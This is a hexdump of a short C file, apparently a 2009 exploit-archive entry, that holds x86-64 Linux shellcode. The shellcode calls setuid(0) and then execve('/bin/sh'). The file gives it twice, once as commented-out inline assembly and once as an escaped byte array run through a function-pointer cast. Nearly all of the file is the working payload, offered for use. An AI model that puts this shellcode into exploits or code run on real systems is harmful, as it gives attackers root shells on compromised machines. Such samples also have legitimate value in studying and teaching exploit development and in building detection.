00000000  2f 2a 0d 0a 73 65 74 75  69 64 28 30 29 20 2b 20  |/*..setuid(0) + |
00000010  65 78 65 63 76 65 28 2f  62 69 6e 2f 73 68 29 20  |execve(/bin/sh) |
00000020  2d 20 6a 75 73 74 20 34  20 66 75 6e 2e 20 0d 0a  |- just 4 fun. ..|
00000030  78 69 34 6f 79 75 20 5b  61 74 5d 20 38 30 73 65  |xi4oyu [at] 80se|
00000040  63 2e 63 6f 6d 0d 0a 20  0d 0a 6d 61 69 6e 28 29  |c.com.. ..main()|
00000050  7b 0d 0a 5f 5f 61 73 6d  28 20 20 22 78 6f 72 71  |{..__asm(  "xorq|
00000060  20 25 72 64 69 2c 25 72  64 69 5c 6e 5c 74 22 0d  | %rdi,%rdi\n\t".|
00000070  0a 20 20 20 20 20 20 20  20 22 6d 6f 76 20 24 30  |.        "mov $0|
00000080  78 36 39 2c 25 61 6c 5c  6e 5c 74 22 0d 0a 20 20  |x69,%al\n\t"..  |
00000090  20 20 20 20 20 20 22 73  79 73 63 61 6c 6c 20 5c  |      "syscall \|
000000a0  6e 5c 74 22 0d 0a 20 20  20 20 20 20 20 20 22 78  |n\t"..        "x|
000000b0  6f 72 71 20 20 20 25 72  64 78 2c 20 25 72 64 78  |orq   %rdx, %rdx|
000000c0  20 5c 6e 5c 74 22 0d 0a  20 20 20 20 20 20 20 20  | \n\t"..        |
000000d0  22 6d 6f 76 71 20 20 20  24 30 78 36 38 37 33 32  |"movq   $0x68732|
000000e0  66 36 65 36 39 36 32 32  66 66 66 2c 25 72 62 78  |f6e69622fff,%rbx|
000000f0  3b 20 5c 6e 5c 74 22 0d  0a 20 20 20 20 20 20 20  |; \n\t"..       |
00000100  20 22 73 68 72 20 20 20  20 24 30 78 38 2c 20 25  | "shr    $0x8, %|
00000110  72 62 78 3b 20 5c 6e 5c  74 22 0d 0a 20 20 20 20  |rbx; \n\t"..    |
00000120  20 20 20 20 22 70 75 73  68 20 20 20 25 72 62 78  |    "push   %rbx|
00000130  3b 20 5c 6e 5c 74 22 0d  0a 20 20 20 20 20 20 20  |; \n\t"..       |
00000140  20 22 6d 6f 76 71 20 20  20 25 72 73 70 2c 25 72  | "movq   %rsp,%r|
00000150  64 69 3b 20 5c 6e 5c 74  22 0d 0a 20 20 20 20 20  |di; \n\t"..     |
00000160  20 20 20 22 78 6f 72 71  20 20 20 25 72 61 78 2c  |   "xorq   %rax,|
00000170  25 72 61 78 3b 20 5c 6e  5c 74 22 0d 0a 20 20 20  |%rax; \n\t"..   |
00000180  20 20 20 20 20 22 70 75  73 68 71 20 20 25 72 61  |     "pushq  %ra|
00000190  78 3b 20 5c 6e 5c 74 22  0d 0a 20 20 20 20 20 20  |x; \n\t"..      |
000001a0  20 20 22 70 75 73 68 71  20 20 25 72 64 69 3b 20  |  "pushq  %rdi; |
000001b0  5c 6e 5c 74 22 0d 0a 20  20 20 20 20 20 20 20 22  |\n\t"..        "|
000001c0  6d 6f 76 71 20 20 20 25  72 73 70 2c 25 72 73 69  |movq   %rsp,%rsi|
000001d0  3b 20 5c 6e 5c 74 22 0d  0a 20 20 20 20 20 20 20  |; \n\t"..       |
000001e0  20 22 6d 6f 76 20 20 20  20 24 30 78 33 62 2c 25  | "mov    $0x3b,%|
000001f0  61 6c 3b 20 5c 6e 5c 74  22 0d 0a 20 20 20 20 20  |al; \n\t"..     |
00000200  20 20 20 22 73 79 73 63  61 6c 6c 20 3b 20 5c 6e  |   "syscall ; \n|
00000210  5c 74 22 0d 0a 20 20 20  20 20 20 20 20 22 70 75  |\t"..        "pu|
00000220  73 68 71 20 20 24 30 78  31 20 3b 20 5c 6e 5c 74  |shq  $0x1 ; \n\t|
00000230  22 0d 0a 20 20 20 20 20  20 20 20 22 70 6f 70 20  |"..        "pop |
00000240  20 20 20 25 72 64 69 20  3b 20 5c 6e 5c 74 22 0d  |   %rdi ; \n\t".|
00000250  0a 20 20 20 20 20 20 20  20 22 70 75 73 68 71 20  |.        "pushq |
00000260  20 24 30 78 33 63 20 3b  20 5c 6e 5c 74 22 0d 0a  | $0x3c ; \n\t"..|
00000270  20 20 20 20 20 20 20 20  22 70 6f 70 20 20 20 20  |        "pop    |
00000280  25 72 61 78 20 3b 20 5c  6e 5c 74 22 0d 0a 20 20  |%rax ; \n\t"..  |
00000290  20 20 20 20 20 20 22 73  79 73 63 61 6c 6c 20 20  |      "syscall  |
000002a0  3b 20 5c 6e 5c 74 22 0d  0a 29 3b 0d 0a 7d 0d 0a  |; \n\t"..);..}..|
000002b0  2a 2f 0d 0a 6d 61 69 6e  28 29 20 7b 0d 0a 20 20  |*/..main() {..  |
000002c0  20 20 20 20 20 20 63 68  61 72 20 73 68 65 6c 6c  |      char shell|
000002d0  63 6f 64 65 5b 5d 20 3d  0d 0a 20 20 20 20 20 20  |code[] =..      |
000002e0  20 20 22 5c 78 34 38 5c  78 33 31 5c 78 66 66 5c  |  "\x48\x31\xff\|
000002f0  78 62 30 5c 78 36 39 5c  78 30 66 5c 78 30 35 5c  |xb0\x69\x0f\x05\|
00000300  78 34 38 5c 78 33 31 5c  78 64 32 5c 78 34 38 5c  |x48\x31\xd2\x48\|
00000310  78 62 62 5c 78 66 66 5c  78 32 66 5c 78 36 32 22  |xbb\xff\x2f\x62"|
00000320  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 36 39 5c  |..        "\x69\|
00000330  78 36 65 5c 78 32 66 5c  78 37 33 5c 78 36 38 5c  |x6e\x2f\x73\x68\|
00000340  78 34 38 5c 78 63 31 5c  78 65 62 5c 78 30 38 5c  |x48\xc1\xeb\x08\|
00000350  78 35 33 5c 78 34 38 5c  78 38 39 5c 78 65 37 5c  |x53\x48\x89\xe7\|
00000360  78 34 38 5c 78 33 31 22  0d 0a 20 20 20 20 20 20  |x48\x31"..      |
00000370  20 20 22 5c 78 63 30 5c  78 35 30 5c 78 35 37 5c  |  "\xc0\x50\x57\|
00000380  78 34 38 5c 78 38 39 5c  78 65 36 5c 78 62 30 5c  |x48\x89\xe6\xb0\|
00000390  78 33 62 5c 78 30 66 5c  78 30 35 5c 78 36 61 5c  |x3b\x0f\x05\x6a\|
000003a0  78 30 31 5c 78 35 66 5c  78 36 61 5c 78 33 63 22  |x01\x5f\x6a\x3c"|
000003b0  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 35 38 5c  |..        "\x58\|
000003c0  78 30 66 5c 78 30 35 22  3b 0d 0a 20 20 20 20 20  |x0f\x05";..     |
000003d0  20 20 20 28 2a 28 76 6f  69 64 20 28 2a 29 28 29  |   (*(void (*)()|
000003e0  29 20 73 68 65 6c 6c 63  6f 64 65 29 28 29 3b 0d  |) shellcode)();.|
000003f0  0a 7d 0d 0a 20 0d 0a 32  30 30 39 2d 30 35 2d 31  |.}.. ..2009-05-1|
00000400  34 0d 0a 65 76 69 6c 2e  78 69 34 6f 79 75        |4..evil.xi4oyu|
0000040e
